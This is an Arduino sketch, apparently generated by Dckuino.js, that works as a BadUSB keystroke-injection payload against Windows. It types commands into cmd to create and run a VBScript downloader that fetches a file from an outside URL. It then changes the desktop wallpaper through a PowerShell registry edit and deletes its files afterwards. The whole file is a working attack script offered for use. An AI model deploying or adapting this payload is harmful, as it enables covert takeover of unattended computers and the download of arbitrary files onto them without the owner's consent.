/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void opencmd(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  delay(400);
  typeKey(KEY_RETURN);
}

void changedir(String directory){
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd "+directory);
  typeKey(KEY_RETURN); 
}

void createdownlscript(){
  Keyboard.print("copy con download.vbs");
  typeKey(KEY_RETURN);
  Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  typeKey(KEY_RETURN);
  Keyboard.print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  typeKey(KEY_RETURN);
  Keyboard.print("If objXMLHTTP.Status = 200 Then");
  typeKey(KEY_RETURN);
  Keyboard.print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  typeKey(KEY_RETURN);
  Keyboard.print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  typeKey(KEY_RETURN);
  Keyboard.print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  typeKey(KEY_RETURN);
  Keyboard.print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
  typeKey(KEY_RETURN);
  Keyboard.print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
}

void deletedownlscript(){
  Keyboard.print("del download.vbs");
  typeKey(KEY_RETURN);
}

void openpowershell(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  delay(100);
  typeKey(KEY_RETURN);
}

void changewallpaper(){
  Keyboard.print("Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value \"C:\\Users\\Public\\nl8lz7.jpg\" ");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
  typeKey(KEY_RETURN);
  delay(1000);
}

/* Init function */
void setup()
{

  String imagename = "nl8lz7.jpg";
  String url = "http://i65.tinypic.com/nl8lz7.jpg";
  
  // Begining the Keyboard stream
  Keyboard.begin();
  delay(500);
  opencmd();
  delay(100);
  changedir("Users\\Public");
  deletedownlscript();
  createdownlscript();
  Keyboard.print("del "+imagename);
  typeKey(KEY_RETURN);
  Keyboard.print("cscript download.vbs "+url);
  typeKey(KEY_RETURN);
  deletedownlscript();
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  
  openpowershell();
  delay(2000);
  changewallpaper();
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(100);  
  
  opencmd();
  delay(100);
  changedir("Users\\Public");
  delay(100);
  Keyboard.print("del "+imagename);
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
